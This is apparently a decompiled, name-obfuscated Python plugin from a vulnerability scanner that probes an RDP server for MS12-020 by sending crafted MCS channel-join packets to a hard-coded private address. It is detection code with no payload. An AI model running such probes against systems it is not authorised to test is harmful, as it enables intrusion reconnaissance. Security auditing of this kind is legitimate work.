# Embedded file name: rdp_vuln_ms12020.py
import struct
import socket


def assign(service, arg):
    if service == "rdp":
        return True, arg


def audit(arg):
    IiII1IiiIiI1, iIiiiI1IiI1I1 = arg
    o0OoOoOO00 = "\x03\x00\x00\x0b\x06\xe0\x00\x00\x00\x00\x00"
    I11i = "\x03\x00\x00\x65\x02\xf0\x80\x7f\x65\x5b\x04\x01\x01\x04\x01\x01\x01\x01\xff\x30\x19\x02\x01\x22\x02\x01\x20\x02\x01\x00\x02\x01\x01\x02\x01\x00\x02\x01\x01\x02\x02\xff\xff\x02\x01\x02\x30\x18\x02\x01\x01\x02\x01\x01\x02\x01\x01\x02\x01\x01\x02\x01\x00\x02\x01\x01\x02\x01\xff\x02\x01\x02\x30\x19\x02\x01\xff\x02\x01\xff\x02\x01\xff\x02\x01\x01\x02\x01\x00\x02\x01\x01\x02\x02\xff\xff\x02\x01\x02\x04\x00"
    O0O = "\x03\x00\x00\x08\x02\xf0\x80\x28"
    try:
        Oo = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Oo.settimeout(10)
        Oo.connect((IiII1IiiIiI1, iIiiiI1IiI1I1))
        Oo.send(o0OoOoOO00)
        I1ii11iIi11i = Oo.recv(1024)
        if I1ii11iIi11i != "\x03\x00\x00\x0b\x06\xd0\x00\x00\x12\x34\x00":
            return False
        Oo.send(I11i)
        Oo.send(O0O)
        I1ii11iIi11i = Oo.recv(1024)
        I1IiI, = struct.unpack(">H", I1ii11iIi11i[9:11])
        Oo.send(O0O)
        I1ii11iIi11i = Oo.recv(1024)
        o0OOO, = struct.unpack(">H", I1ii11iIi11i[9:11])
        o0OOO += 1001
        iIiiiI = struct.pack(">HH", I1IiI, o0OOO)
        Iii1ii1II11i = "\x03\x00\x00\x0c\x02\xf0\x80\x38"
        iI111iI = Iii1ii1II11i + iIiiiI
        Oo.send(iI111iI)
        I1ii11iIi11i = Oo.recv(1024)
        if I1ii11iIi11i[7:9] == ">\x00":
            iIiiiI = struct.pack(">HH", o0OOO - 1001, o0OOO)
            iI111iI = Iii1ii1II11i + iIiiiI
            Oo.send(iI111iI)
            Oo.recv(1024)
            security_warning("rdp://%s:%d" % (IiII1IiiIiI1, iIiiiI1IiI1I1))
        Oo.close()
    except:
        pass


if __name__ == '__main__':
    from dummy import *

    audit(assign('''rdp''', ("192.168.1.180", 3389))[1])

    # KEY---0d4af56f54b549460eae50cb9dc579022c7e046e050fbc72242da5f616e21867---
